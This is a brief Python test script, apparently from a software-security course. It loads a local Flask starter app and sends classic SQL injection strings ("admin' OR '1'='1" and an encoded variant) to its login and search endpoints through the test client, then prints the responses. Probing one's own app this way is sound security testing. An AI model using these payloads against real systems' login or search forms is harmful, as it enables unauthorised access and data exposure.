import importlib.util
import os
os.environ['TEAM_ID'] = 'demo'

spec = importlib.util.spec_from_file_location('nv', r'C:\Users\andre\software-security\project\starter-app\app.py')
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
mod.seed()
client = mod.app.test_client()

payload = "admin' OR '1'='1"
resp = client.post('/login', data={'username': payload, 'password': 'x'}, follow_redirects=False)
print('login_status=', resp.status_code)
print('login_body=', resp.get_data(as_text=True)[:200])

resp2 = client.get('/search?q=milk%27%20OR%20%271%27%3D%271', follow_redirects=False)
print('search_status=', resp2.status_code)
print('search_body=', resp2.get_data(as_text=True)[:200])
